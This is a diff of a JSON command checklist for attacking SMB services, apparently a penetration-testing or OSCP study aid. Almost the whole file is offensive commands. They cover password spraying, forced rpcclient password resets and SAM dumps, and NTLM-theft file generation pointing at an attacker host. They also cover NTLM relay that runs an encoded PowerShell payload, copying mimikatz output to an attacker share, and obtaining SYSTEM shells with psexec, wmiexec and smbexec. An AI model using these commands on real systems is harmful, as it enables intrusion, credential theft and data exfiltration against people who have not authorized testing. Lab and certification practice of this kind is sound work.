@@ -1,63 +1,210 @@
 {
   "service": "SMB",
   "port": 445,
-  "tasks": [
+  "categories": [
     {
-      "id": "smb_null_guest",
-      "title": "Null & Guest Session Enumeration",
-      "description": "Attempt to list shares using blank credentials or the guest account.",
-      "commands": [
-        "smbclient -L \\\\\\\\{target_ip}\\\\ -U '%'",
-        "smbclient -L \\\\\\\\{target_ip}\\\\ -U 'guest'%",
-        "smbclient -L \\\\\\\\{target_ip}\\\\ -N"
+      "category": "1. Recon & Null Sessions",
+      "tasks": [
+        {
+          "id": "smb_nmap",
+          "title": "Nmap SMB Scan",
+          "description": "Basic port check and script scan for SMB.",
+          "commands": [
+            "nmap -v -p 139,445 -oG scans/smb_{target_ip}.txt {target_ip}",
+            "nmap --script smb-os-discovery,smb-enum-shares -p 139,445 {target_ip}"
+          ]
+        },
+        {
+          "id": "smb_null_guest",
+          "title": "SMBClient Anonymous/Guest Enumeration",
+          "description": "Attempt to list shares using blank credentials or the guest account.",
+          "commands": [
+            "smbclient -L \\\\\\\\{target_ip}\\\\ -U '%'",
+            "smbclient -L \\\\\\\\{target_ip}\\\\ -U 'guest'%",
+            "smbclient -L \\\\\\\\{target_ip}\\\\ -N"
+          ]
+        },
+        {
+          "id": "smb_enum4linux",
+          "title": "Enum4Linux Recon",
+          "description": "Run Enum4Linux for comprehensive share, user, and domain enumeration.",
+          "commands": [
+            "enum4linux -a {target_ip}"
+          ]
+        }
       ]
     },
     {
-      "id": "smb_enum_tools",
-      "title": "Automated Share & User Enumeration",
-      "description": "Run standard enumeration tools to map out shares, permissions, and domain details.",
-      "commands": [
-        "enum4linux -a {target_ip}",
-        "smbmap -H {target_ip}",
-        "netexec smb {target_ip} --shares --verbose"
+      "category": "2. Authenticated Enumeration",
+      "tasks": [
+        {
+          "id": "smb_auth_connect",
+          "title": "Connect & Loot Shares",
+          "description": "Connect to a specific accessible share. Use 'get' to download files and 'put' to test upload permissions.",
+          "commands": [
+            "smbclient \\\\\\\\{target_ip}\\\\<ShareName> -U '<Domain>\\\\<user>' --password '<password>'",
+            "smbclient -L \\\\\\\\{target_ip}\\\\ -U <user>",
+            "smbclient \\\\\\\\{target_ip}\\\\<ShareName> -U <user> --pw-nt-hash <NTLM_HASH>"
+          ]
+        },
+        {
+          "id": "smb_download_all",
+          "title": "Recursive Share Download",
+          "description": "Quickly pull an entire SMB share to your local machine for offline analysis.",
+          "commands": [
+            "smbclient \\\\\\\\{target_ip}\\\\<ShareName> -U '<user>' -c 'prompt OFF; recurse ON; mget *'",
+            "smbget -R smb://{target_ip}/<ShareName> -U '<user>'"
+          ]
+        },
+        {
+          "id": "smb_mount_cifs",
+          "title": "Mount Share Locally (CIFS)",
+          "description": "Mount the remote share to your Kali filesystem to bypass smbclient limitations and use native Linux tools like grep.",
+          "commands": [
+            "sudo mkdir -p /mnt/smb",
+            "sudo mount -t cifs -o 'username=guest,password=' //{target_ip}/<ShareName> /mnt/smb",
+            "sudo mount -t cifs -o 'username=<user>,password=<password>,domain=<domain>' //{target_ip}/<ShareName> /mnt/smb",
+            "sudo umount /mnt/smb"
+          ]
+        },
+        {
+          "id": "smb_smbmap",
+          "title": "SMBMap Permissions Check",
+          "description": "Map out all share drives and check read/write permissions for a specific user.",
+          "commands": [
+            "smbmap -u '<user>' -p '<password>' -d <domain> -H {target_ip}"
+          ]
+        },
+        {
+          "id": "smb_password_spray",
+          "title": "Password Spraying (CME / NetExec)",
+          "description": "Use CrackMapExec or NetExec to spray user lists and custom wordlists against SMB.",
+          "commands": [
+            "crackmapexec smb {target_ip} -u users.txt -p '/home/kali/Desktop/OSCP/Tools/Password cracking/jonspass.txt' --continue-on-success --shares",
+            "netexec smb {target_ip} -u <user> -p '<password>' --verbose --shares"
+          ]
+        }
       ]
     },
     {
-      "id": "smb_connect_loot",
-      "title": "Connect & Loot Shares",
-      "description": "Connect to a specific accessible share. Use 'get' to download files and 'put' to test upload permissions.",
-      "commands": [
-        "smbclient \\\\\\\\{target_ip}\\\\<ShareName> -U '%'",
-        "smbclient \\\\\\\\{target_ip}\\\\<ShareName> -U '<Domain>\\\\<user>' --password '<password>'"
+      "category": "3. RPC Client Enumeration",
+      "tasks": [
+        {
+          "id": "rpc_connect",
+          "title": "RPCClient Connect",
+          "description": "Attempt connection to the RPC endpoint (Null or Authenticated).",
+          "commands": [
+            "rpcclient -U '' -N {target_ip}",
+            "rpcclient -U '<domain>\\\\<user>'%<password> {target_ip}"
+          ]
+        },
+        {
+          "id": "rpc_queries",
+          "title": "RPC Info Gathering",
+          "description": "Commands to execute once connected to the rpcclient prompt to dump users, groups, and reset passwords.",
+          "commands": [
+            "enumdomusers",
+            "enumdomgroups",
+            "queryuser <username_rid>",
+            "querygroup <group_rid>",
+            "setuserinfo2 <user> 23 'Password123!'"
+          ]
+        },
+        {
+          "id": "rpc_impacket",
+          "title": "Impacket RPC/SAM Dumps",
+          "description": "Use Impacket to dump RPC endpoints and SAM data automatically with known credentials.",
+          "commands": [
+            "impacket-rpcdump <domain>/<user>:<password>@{target_ip}",
+            "impacket-samrdump <domain>/<user>:<password>@{target_ip}"
+          ]
+        }
       ]
     },
     {
-      "id": "smb_password_spray",
-      "title": "Password Spraying & Brute-Force",
-      "description": "Use CrackMapExec or NetExec to spray user lists and custom wordlists.",
-      "commands": [
-        "crackmapexec smb {target_ip} -u users.txt -p '/home/kali/Desktop/OSCP/Tools/Password cracking/jonspass.txt' --continue-on-success",
-        "netexec smb {target_ip} -u users.txt -p rockyou.txt --local-auth"
+      "category": "4. Relaying & File Transfers",
+      "tasks": [
+        {
+          "id": "smb_ntlm_theft",
+          "title": "Generate NTLM Theft Payload",
+          "description": "Generate malicious files (like .lnk) to upload to a writable share to force authentication back to you.",
+          "commands": [
+            "python3 ntlm_theft.py --generate all --server <Kali_IP> --f test"
+          ]
+        },
+        {
+          "id": "smb_ntlm_relay",
+          "title": "Responder & NTLMRelayX",
+          "description": "Catch hashes with Responder, or relay them directly to execute a base64 powershell payload.",
+          "commands": [
+            "sudo responder -I tun0",
+            "impacket-ntlmrelayx --no-http-server -smb2support -t {target_ip} -c \"powershell -enc <base64_payload>\""
+          ]
+        },
+        {
+          "id": "smb_server_host",
+          "title": "Host SMB Server for File Transfer",
+          "description": "Host an SMB server on Kali to transfer files to/from the target.",
+          "commands": [
+            "impacket-smbserver test . -smb2support -username kali -password kali",
+            "net use m: \\\\\\\\<Kali_IP>\\\\test /user:kali kali",
+            "copy mimikatz.log m:\\\\"
+          ]
+        }
       ]
     },
     {
-      "id": "smb_impacket_exec",
-      "title": "Impacket Command Execution",
-      "description": "If you have administrative credentials or NTLM hashes, execute commands or get an interactive SYSTEM shell.",
-      "commands": [
-        "impacket-psexec <user>:'<password>'@{target_ip}",
-        "impacket-wmiexec -hashes 00000000000000000000000000000000:<NTHash> <user>@{target_ip}",
-        "impacket-smbexec <user>:'<password>'@{target_ip}"
+      "category": "5. Command Execution & Shells",
+      "tasks": [
+        {
+          "id": "smb_psexec",
+          "title": "Impacket PsExec",
+          "description": "Gain an interactive SYSTEM shell using administrative credentials or NTLM hashes. Interactive shell will always be SYSTEM.",
+          "commands": [
+            "impacket-psexec <user>@{target_ip} -no-pass",
+            "impacket-psexec <domain>/<user>:'<password>'@{target_ip}",
+            "impacket-psexec -hashes 00000000000000000000000000000000:<NTHash> <user>@{target_ip}"
+          ]
+        },
+        {
+          "id": "smb_wmiexec",
+          "title": "Impacket WMIExec",
+          "description": "Execute commands stealthily via WMI (bypasses some AV compared to PsExec).",
+          "commands": [
+            "impacket-wmiexec \"<user>\":<password>@{target_ip}",
+            "impacket-wmiexec -hashes 00000000000000000000000000000000:<NTHash> <user>@{target_ip}"
+          ]
+        },
+        {
+          "id": "smb_smbexec",
+          "title": "Impacket SMBExec",
+          "description": "A similar approach to PsExec but doesn't drop a binary on the target. Good for getting a quick bind shell payload across.",
+          "commands": [
+            "impacket-smbexec <user>:'<password>'@{target_ip}"
+          ]
+        }
       ]
     },
     {
-      "id": "smb_ntlm_relay",
-      "title": "NTLM Relaying & Theft",
-      "description": "Generate a malicious payload with ntlm_theft, upload it to a writable share, and catch the hash with Responder or relay it.",
-      "commands": [
-        "python3 ntlm_theft.py --generate all --server <Kali_IP> --f test",
-        "sudo responder -I tun0",
-        "impacket-ntlmrelayx --no-http-server -smb2support -t {target_ip} -c \"powershell -enc <base64_payload>\""
+      "category": "6. Known Vulnerabilities",
+      "tasks": [
+        {
+          "id": "smb_ms17_010",
+          "title": "EternalBlue (MS17-010) Check",
+          "description": "Scan for the MS17-010 vulnerability, which allows unauthenticated remote code execution as SYSTEM.",
+          "commands": [
+            "nmap --script smb-vuln-ms17-010 -p 445 {target_ip}",
+            "crackmapexec smb {target_ip} -M ms17-010"
+          ]
+        },
+        {
+          "id": "smb_zerologon",
+          "title": "ZeroLogon (CVE-2020-1472) Check",
+          "description": "Check if a Domain Controller is vulnerable to ZeroLogon.",
+          "commands": [
+            "crackmapexec smb {target_ip} -M zerologon"
+          ]
+        }
       ]
     }
   ]
